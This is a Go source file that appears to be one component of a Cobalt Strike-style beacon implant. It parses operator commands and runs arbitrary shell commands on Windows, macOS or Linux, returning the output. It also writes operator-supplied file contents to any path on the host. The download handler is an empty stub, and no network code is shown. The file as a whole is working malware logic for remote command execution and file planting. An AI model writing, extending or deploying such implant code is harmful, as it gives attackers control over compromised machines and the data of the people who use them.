package packet

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

const (
	CMD_TYPE_SLEEP        = 4
	CMD_TYPE_SHELL        = 78
	CMD_TYPE_UPLOAD_START = 10
	CMD_TYPE_UPLOAD_LOOP  = 67
	CMD_TYPE_DOWNLOAD     = 11
)

func ParseCommandShell(b []byte) (string, []byte) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		panic(err)
	}
	pathLen := ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		panic(err)
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		panic(err)
	}

	cmdLen := ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd
}

func Shell(path string, args []byte) []byte {
	switch runtime.GOOS {
	case "windows":
		args = bytes.Trim(args," ")
		argsArray := strings.Split(string(args), " ")
		cmd := exec.Command(path, argsArray...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Sprintf("exec failed with %s\n", err)
		}
		return out
	case "darwin":
		path = "/bin/bash"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	case "linux":
		path = "/bin/sh"
		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	}
	args = bytes.Trim(args," ")
	startPos := bytes.Index(args,[]byte("-c"))
	args = args[startPos + 3 : ]
	argsArray := []string{ "-c", string(args) }
	cmd := exec.Command(path, argsArray...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Sprintf("exec failed with %s\n", err)
	}
	return out

}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte) int {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		//fmt.Printf("file create err : %v\n", err)
		return 0
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		//fmt.Printf("file write err : %v\n", err)
		return 0
	}
	//fmt.Printf("the offset is %d\n",offset)
	return offset
}

func Download() {

}
